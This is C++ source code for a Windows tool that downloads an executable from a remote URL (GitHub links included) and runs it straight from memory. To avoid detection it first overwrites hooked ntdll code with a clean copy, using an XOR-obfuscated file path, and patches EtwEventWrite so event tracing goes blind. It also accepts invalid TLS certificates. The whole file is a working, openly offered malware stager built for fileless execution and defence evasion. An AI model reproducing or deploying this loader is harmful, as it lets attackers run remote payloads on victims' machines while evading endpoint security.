#include <WinSock2.h>
#include <Windows.h>
#include <stdio.h>
#include <winhttp.h>
#include <vector>
#include <stdint.h>
#include <iostream>
#include <winternl.h>
#include <stdlib.h>
#include <string.h>

#pragma warning (disable: 4996)
#pragma comment(lib,"WS2_32.lib")
#pragma comment(lib, "winhttp")
#pragma comment(lib, "advapi32")

#define PATH MAX_PATH

// Color definitions
#define COLOR_DEFAULT 7
#define COLOR_SUCCESS 10
#define COLOR_ERROR 12
#define COLOR_WARNING 14
#define COLOR_INFO 11

using namespace std;

// Global variables for command line hijacking
bool hijackCmdline = false;
char* sz_masqCmd_Ansi = NULL;
wchar_t* sz_masqCmd_Widh = NULL;
int int_masqCmd_Argc = 0;

// Function pointers
typedef BOOL(WINAPI* VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
VirtualProtect_t VirtualProtect_p = NULL;

// XOR encryption key
const char XOR_KEY = 0x5A;

// Console color functions
void SetColor(int color) {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hConsole, color);
}

void PrintSuccess(const char* text) {
    SetColor(COLOR_SUCCESS);
    printf("%s", text);
    SetColor(COLOR_DEFAULT);
}

void PrintError(const char* text) {
    SetColor(COLOR_ERROR);
    printf("%s", text);
    SetColor(COLOR_DEFAULT);
}

void PrintWarning(const char* text) {
    SetColor(COLOR_WARNING);
    printf("%s", text);
    SetColor(COLOR_DEFAULT);
}

void PrintInfo(const char* text) {
    SetColor(COLOR_INFO);
    printf("%s", text);
    SetColor(COLOR_DEFAULT);
}

void XORcrypt(char* str2xor, size_t len, char key) {
    for (size_t i = 0; i < len; i++) {
        str2xor[i] = (BYTE)str2xor[i] ^ key;
    }
}

// Convert GitHub blob URL to raw URL - FIXED VERSION
bool ConvertGitHubToRaw(char* url, size_t urlSize) {
    // Check if it's a GitHub blob URL
    if (strstr(url, "github.com") && strstr(url, "/blob/")) {
        char converted[2048] = { 0 };
        char* protocolEnd = strstr(url, "://");

        if (protocolEnd) {
            protocolEnd += 3; // Skip "://"
            char* hostEnd = strstr(protocolEnd, "/");
            if (hostEnd) {
                // Copy protocol (http:// or https://)
                size_t protocolLen = protocolEnd - url;
                if (protocolLen < urlSize) {
                    strncpy(converted, url, protocolLen);

                    // Add raw.githubusercontent.com
                    strcat(converted, "raw.githubusercontent.com");

                    // Find the blob part - we need to keep username/repo and remove only "/blob/"
                    char* blobPos = strstr(hostEnd, "/blob/");
                    if (blobPos) {
                        // Add everything after the host up to "/blob/"
                        size_t pathBeforeBlob = blobPos - hostEnd;
                        char temp[1024] = { 0 };
                        strncpy(temp, hostEnd, pathBeforeBlob);
                        strcat(converted, temp);

                        // Add everything after "/blob/"
                        strcat(converted, blobPos + 5); // Skip "/blob/"

                        // Debug print
                        printf("[DEBUG] Converted URL: %s\n", converted);
                    }
                    else {
                        strcat(converted, hostEnd);
                    }

                    // Check if converted URL fits in the original buffer
                    if (strlen(converted) < urlSize) {
                        strcpy(url, converted);
                        PrintSuccess("[+] Converted GitHub blob URL to raw URL\n");
                        return true;
                    }
                    else {
                        PrintError("[!] Converted URL is too long\n");
                        return false;
                    }
                }
            }
        }
        return false;
    }
    return false;
}

// Get NT headers from PE buffer
char* GetNTHeaders(char* pe_buffer) {
    if (pe_buffer == NULL) return NULL;

    IMAGE_DOS_HEADER* idh = (IMAGE_DOS_HEADER*)pe_buffer;
    if (idh->e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL;
    }

    LONG pe_offset = idh->e_lfanew;
    if (pe_offset > 1024) return NULL;

    IMAGE_NT_HEADERS* inh = (IMAGE_NT_HEADERS*)((char*)pe_buffer + pe_offset);
    if (inh->Signature != IMAGE_NT_SIGNATURE) return NULL;

    return (char*)inh;
}

// Get PE directory entry
IMAGE_DATA_DIRECTORY* GetPEDirectory(PVOID pe_buffer, size_t dir_id) {
    if (dir_id >= IMAGE_NUMBEROF_DIRECTORY_ENTRIES) return NULL;

    char* nt_headers = GetNTHeaders((char*)pe_buffer);
    if (nt_headers == NULL) return NULL;

    IMAGE_NT_HEADERS* nt_header = (IMAGE_NT_HEADERS*)nt_headers;
    IMAGE_DATA_DIRECTORY* peDir = &(nt_header->OptionalHeader.DataDirectory[dir_id]);

    if (peDir->VirtualAddress == NULL) {
        return NULL;
    }
    return peDir;
}

// Unhook ntdll by copying fresh .text section
int UnhookNtdll(const HMODULE hNtdll, const LPVOID pMapping) {
    DWORD oldprotect = 0;
    PIMAGE_DOS_HEADER pidh = (PIMAGE_DOS_HEADER)pMapping;
    PIMAGE_NT_HEADERS pinh = (PIMAGE_NT_HEADERS)((DWORD_PTR)pMapping + pidh->e_lfanew);

    for (int i = 0; i < pinh->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER pish = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pinh) +
            ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

        if (strcmp((char*)pish->Name, ".text") == 0) {
            if (!VirtualProtect_p((LPVOID)((DWORD_PTR)hNtdll + pish->VirtualAddress),
                pish->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldprotect)) {
                return -1;
            }

            memcpy((LPVOID)((DWORD_PTR)hNtdll + pish->VirtualAddress),
                (LPVOID)((DWORD_PTR)pMapping + pish->VirtualAddress),
                pish->Misc.VirtualSize);

            VirtualProtect_p((LPVOID)((DWORD_PTR)hNtdll + pish->VirtualAddress),
                pish->Misc.VirtualSize, oldprotect, &oldprotect);
            return 0;
        }
    }
    return -1;
}

// Disable ETW by patching EtwEventWrite
void DisableETW(void) {
    DWORD oldprotect = 0;
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return;

    void* pEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEventWrite) return;

    VirtualProtect_p(pEventWrite, 4096, PAGE_EXECUTE_READWRITE, &oldprotect);

#ifdef _WIN64
    memcpy(pEventWrite, "\x48\x33\xc0\xc3", 4);
#else
    memcpy(pEventWrite, "\x33\xc0\xc2\x14\x00", 5);
#endif

    VirtualProtect_p(pEventWrite, 4096, oldprotect, &oldprotect);
    FlushInstructionCache(GetCurrentProcess(), pEventWrite, 4096);
}

// Fix Import Address Table
bool RepairIAT(PVOID modulePtr) {
    IMAGE_DATA_DIRECTORY* importsDir = GetPEDirectory(modulePtr, IMAGE_DIRECTORY_ENTRY_IMPORT);
    if (importsDir == NULL) return false;

    size_t impAddr = importsDir->VirtualAddress;
    IMAGE_IMPORT_DESCRIPTOR* lib_desc = NULL;
    size_t parsedSize = 0;

    for (; parsedSize < importsDir->Size; parsedSize += sizeof(IMAGE_IMPORT_DESCRIPTOR)) {
        lib_desc = (IMAGE_IMPORT_DESCRIPTOR*)(impAddr + parsedSize + (ULONG_PTR)modulePtr);

        if (lib_desc->OriginalFirstThunk == NULL && lib_desc->FirstThunk == NULL) break;

        LPSTR lib_name = (LPSTR)((ULONGLONG)modulePtr + lib_desc->Name);
        HMODULE hLib = LoadLibraryA(lib_name);

        size_t call_via = lib_desc->FirstThunk;
        size_t thunk_addr = lib_desc->OriginalFirstThunk;
        if (thunk_addr == NULL) thunk_addr = lib_desc->FirstThunk;

        size_t offsetField = 0;
        size_t offsetThunk = 0;

        while (true) {
            IMAGE_THUNK_DATA* fieldThunk = (IMAGE_THUNK_DATA*)(size_t(modulePtr) + offsetField + call_via);
            IMAGE_THUNK_DATA* orginThunk = (IMAGE_THUNK_DATA*)(size_t(modulePtr) + offsetThunk + thunk_addr);

            if (orginThunk->u1.Function == NULL) break;

            if (orginThunk->u1.Ordinal & (IMAGE_ORDINAL_FLAG32 | IMAGE_ORDINAL_FLAG64)) {
                size_t addr = (size_t)GetProcAddress(hLib, (char*)(orginThunk->u1.Ordinal & 0xFFFF));
                fieldThunk->u1.Function = addr;
            }
            else {
                PIMAGE_IMPORT_BY_NAME by_name = (PIMAGE_IMPORT_BY_NAME)(size_t(modulePtr) + orginThunk->u1.AddressOfData);
                LPSTR func_name = (LPSTR)by_name->Name;
                size_t addr = (size_t)GetProcAddress(hLib, func_name);
                fieldThunk->u1.Function = addr;
            }

            offsetField += sizeof(IMAGE_THUNK_DATA);
            offsetThunk += sizeof(IMAGE_THUNK_DATA);
        }
    }
    return true;
}

// Process relocation table
void ProcessRelocations(PVOID pImageBase, IMAGE_NT_HEADERS* ntHeader, DWORD_PTR delta) {
    if (delta == 0) return;

    IMAGE_DATA_DIRECTORY* relocDir = &ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (relocDir->Size == 0) return;

    DWORD_PTR relocAddr = (DWORD_PTR)pImageBase + relocDir->VirtualAddress;
    PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)relocAddr;

    while (reloc->VirtualAddress != 0 && reloc->SizeOfBlock != 0) {
        DWORD numEntries = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        WORD* entries = (WORD*)(reloc + 1);

        for (DWORD i = 0; i < numEntries; i++) {
            if (entries[i] == 0) continue;

            DWORD type = entries[i] >> 12;
            DWORD offset = entries[i] & 0xFFF;

            if (type == IMAGE_REL_BASED_DIR64) {
                DWORD_PTR* patchAddr = (DWORD_PTR*)((DWORD_PTR)pImageBase + reloc->VirtualAddress + offset);
                *patchAddr += delta;
            }
            else if (type == IMAGE_REL_BASED_HIGHLOW) {
                DWORD* patchAddr = (DWORD*)((DWORD_PTR)pImageBase + reloc->VirtualAddress + offset);
                *patchAddr += (DWORD)delta;
            }
            else if (type == IMAGE_REL_BASED_HIGH) {
                WORD* patchAddr = (WORD*)((DWORD_PTR)pImageBase + reloc->VirtualAddress + offset);
                *patchAddr += HIWORD(delta);
            }
            else if (type == IMAGE_REL_BASED_LOW) {
                WORD* patchAddr = (WORD*)((DWORD_PTR)pImageBase + reloc->VirtualAddress + offset);
                *patchAddr += LOWORD(delta);
            }
        }
        reloc = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)reloc + reloc->SizeOfBlock);
    }
}

// Load and execute PE
void PELoader(char* data, size_t datasize) {
    if (!data || datasize == 0) {
        return;
    }

    IMAGE_DOS_HEADER* pDosHeader = (IMAGE_DOS_HEADER*)data;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return;
    }

    IMAGE_NT_HEADERS* ntHeader = (IMAGE_NT_HEADERS*)(data + pDosHeader->e_lfanew);
    if (ntHeader->Signature != IMAGE_NT_SIGNATURE) {
        return;
    }

    BYTE* pImageBase = (BYTE*)VirtualAlloc((LPVOID)ntHeader->OptionalHeader.ImageBase,
        ntHeader->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    DWORD_PTR delta = 0;
    if (!pImageBase) {
        pImageBase = (BYTE*)VirtualAlloc(NULL,
            ntHeader->OptionalHeader.SizeOfImage,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE);
        if (!pImageBase) {
            return;
        }
        delta = (DWORD_PTR)pImageBase - ntHeader->OptionalHeader.ImageBase;
    }

    memcpy(pImageBase, data, ntHeader->OptionalHeader.SizeOfHeaders);

    IMAGE_SECTION_HEADER* sections = (IMAGE_SECTION_HEADER*)(data + pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS));
    for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
        if (sections[i].SizeOfRawData) {
            memcpy(pImageBase + sections[i].VirtualAddress,
                data + sections[i].PointerToRawData,
                sections[i].SizeOfRawData);
        }
    }

    if (delta != 0) {
        ProcessRelocations(pImageBase, ntHeader, delta);
    }

    RepairIAT(pImageBase);

    IMAGE_NT_HEADERS* newNtHeader = (IMAGE_NT_HEADERS*)(pImageBase + pDosHeader->e_lfanew);
    newNtHeader->OptionalHeader.ImageBase = (DWORD_PTR)pImageBase;

    DWORD_PTR entryPoint = (DWORD_PTR)pImageBase + ntHeader->OptionalHeader.AddressOfEntryPoint;

    DWORD oldProtect;
    VirtualProtect(pImageBase, ntHeader->OptionalHeader.SizeOfImage, PAGE_EXECUTE_READWRITE, &oldProtect);

    ((void(*)())entryPoint)();
}

// Download PE from HTTP/HTTPS
char* DownloadPE(const wchar_t* domain, const wchar_t* path, int port, bool useSSL, size_t* outSize) {
    vector<BYTE> PEbuf;
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    BOOL bResults = FALSE;

    hSession = WinHttpOpen(L"PE-Loader/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);

    if (!hSession) {
        return NULL;
    }

    hConnect = WinHttpConnect(hSession, domain, port, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return NULL;
    }

    DWORD flags = useSSL ? WINHTTP_FLAG_SECURE : 0;
    hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        flags);

    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return NULL;
    }

    if (useSSL) {
        DWORD securityFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
            SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
            SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &securityFlags, sizeof(securityFlags));
    }

    bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        WINHTTP_NO_REQUEST_DATA, 0, 0, 0);

    if (bResults) {
        bResults = WinHttpReceiveResponse(hRequest, NULL);
    }

    if (bResults) {
        DWORD dwSize = 0;
        DWORD dwDownloaded = 0;
        BYTE* pszOutBuffer;

        do {
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
                break;
            }

            if (dwSize == 0) break;

            pszOutBuffer = new BYTE[dwSize];
            if (!pszOutBuffer) {
                break;
            }

            ZeroMemory(pszOutBuffer, dwSize);

            if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded)) {
                delete[] pszOutBuffer;
                break;
            }

            PEbuf.insert(PEbuf.end(), pszOutBuffer, pszOutBuffer + dwDownloaded);
            delete[] pszOutBuffer;

        } while (dwSize > 0);
    }

    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);

    if (PEbuf.empty()) {
        return NULL;
    }

    char* PE = (char*)malloc(PEbuf.size());
    if (!PE) return NULL;

    memcpy(PE, PEbuf.data(), PEbuf.size());
    *outSize = PEbuf.size();
    return PE;
}

// Parse URL and extract components
bool ParseURL(const char* url, wchar_t* domain, wchar_t* path, int* port, bool* useSSL) {
    char domainBuf[256] = { 0 };
    char pathBuf[1024] = { 0 };

    if (!url || !domain || !path || !port || !useSSL) {
        return false;
    }

    *useSSL = false;
    *port = 80;

    if (strncmp(url, "https://", 8) == 0) {
        *useSSL = true;
        *port = 443;
        url += 8;
    }
    else if (strncmp(url, "http://", 7) == 0) {
        url += 7;
    }
    else {
        return false;
    }

    const char* pathStart = strchr(url, '/');
    if (!pathStart) {
        strcpy(domainBuf, url);
        strcpy(pathBuf, "/");
    }
    else {
        size_t domainLen = pathStart - url;
        if (domainLen >= sizeof(domainBuf)) {
            return false;
        }
        strncpy(domainBuf, url, domainLen);
        domainBuf[domainLen] = '\0';
        strcpy(pathBuf, pathStart);
    }

    const char* portStart = strchr(domainBuf, ':');
    if (portStart) {
        *port = atoi(portStart + 1);
        if (*port <= 0 || *port > 65535) {
            return false;
        }
        size_t portLen = portStart - domainBuf;
        domainBuf[portLen] = '\0';
    }

    if (mbstowcs(domain, domainBuf, strlen(domainBuf) + 1) == (size_t)-1) {
        return false;
    }

    if (mbstowcs(path, pathBuf, strlen(pathBuf) + 1) == (size_t)-1) {
        return false;
    }

    return true;
}

// NewNtdllPatchETW - Unhook ntdll and patch ETW
void NewNtdllPatchETW() {
    char sNtdllPath[] = { 0x59, 0x0, 0x66, 0x4d, 0x53, 0x54, 0x5e, 0x55, 0x4d, 0x49, 0x66, 0x49, 0x43, 0x49, 0x4e, 0x5f, 0x57, 0x9, 0x8, 0x66, 0x54, 0x4e, 0x5e, 0x56, 0x56, 0x14, 0x5e, 0x56, 0x56, 0x3a };
    size_t sNtdllPath_len = sizeof(sNtdllPath);
    XORcrypt((char*)sNtdllPath, sNtdllPath_len, sNtdllPath[sNtdllPath_len - 1]);

    char sKernel32[] = "kernel32.dll";
    char sNtdll[] = "ntdll.dll";
    char sVirtualProtect[] = "VirtualProtect";

    VirtualProtect_p = (VirtualProtect_t)GetProcAddress(GetModuleHandleA(sKernel32), sVirtualProtect);
    if (!VirtualProtect_p) return;

    HANDLE hFile = CreateFileA(sNtdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return;
    }

    HANDLE hFileMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hFileMapping) {
        CloseHandle(hFile);
        return;
    }

    LPVOID pMapping = MapViewOfFile(hFileMapping, FILE_MAP_READ, 0, 0, 0);
    if (!pMapping) {
        CloseHandle(hFileMapping);
        CloseHandle(hFile);
        return;
    }

    HMODULE hNtdll = GetModuleHandleA(sNtdll);
    if (hNtdll) {
        UnhookNtdll(hNtdll, pMapping);
    }

    UnmapViewOfFile(pMapping);
    CloseHandle(hFileMapping);
    CloseHandle(hFile);

    DisableETW();
}

int main(int argc, char** argv) {
    // Set console title
    SetConsoleTitle(L"MAXADO GOD </>");

    // Print ASCII art banner with color
    SetColor(COLOR_INFO);
    printf("                                      ___ ___   _    ___   _   ___  ___ ___ \n");
    printf("                                     | _ \\ __| | |  / _ \\ /_\\ |   \\| __| _ \\\n");
    printf("                                     |  _/ _|  | |_| (_) / _ \\| |) | _||   /\n");
    printf("                                     |_| |___| |____\\___/_/ \\_\\___/|___|_|_\\\n");
    SetColor(COLOR_DEFAULT);
    printf("\n");

    // Print developer credit
    SetColor(COLOR_INFO);
    printf("                                             Developer : Maxado God\n");
    SetColor(COLOR_DEFAULT);
    printf("\n");

    // Initialize Winsock
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    // Unhook and patch ETW
    NewNtdllPatchETW();

    // Get URL from user or command line
    char uri[2048] = { 0 };

    if (argc > 1) {
        strcpy(uri, argv[1]);
    }
    else {
        SetColor(COLOR_WARNING);
        printf("[+] Enter url : ");
        SetColor(COLOR_DEFAULT);
        fgets(uri, sizeof(uri), stdin);

        // Remove newline
        size_t len = strlen(uri);
        if (len > 0 && uri[len - 1] == '\n') {
            uri[len - 1] = '\0';
        }
    }

    if (strlen(uri) == 0) {
        PrintError("[!] No URL provided\n");
        WSACleanup();
        system("pause");
        return 1;
    }

    // Convert GitHub blob URL to raw URL if needed
    ConvertGitHubToRaw(uri, sizeof(uri));

    // Parse URL
    wchar_t domain[256] = { 0 };
    wchar_t path[1024] = { 0 };
    int port = 0;
    bool useSSL = false;

    if (!ParseURL(uri, domain, path, &port, &useSSL)) {
        PrintError("[!] Failed to parse URL\n");
        WSACleanup();
        system("pause");
        return 1;
    }

    PrintInfo("[+] Downloading PE from: ");
    SetColor(COLOR_DEFAULT);
    printf("%s\n", uri);

    // Download PE
    size_t peSize = 0;
    char* PE = DownloadPE(domain, path, port, useSSL, &peSize);
    if (!PE) {
        PrintError("[!] Failed to download PE\n");
        WSACleanup();
        system("pause");
        return 1;
    }

    // Check if it's a valid PE
    IMAGE_DOS_HEADER* pDosHeader = (IMAGE_DOS_HEADER*)PE;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        PrintError("[!] Downloaded file is not a valid PE\n");
        free(PE);
        WSACleanup();
        system("pause");
        return 1;
    }

    PrintSuccess("[+] Successfully downloaded and loaded!\n");
    printf("\n");

    // Small delay to see the success message
    Sleep(1000);

    // Clear the console
    system("cls");

    // Load and execute PE
    PELoader(PE, peSize);

    // Cleanup
    free(PE);
    WSACleanup();

    return 0;
}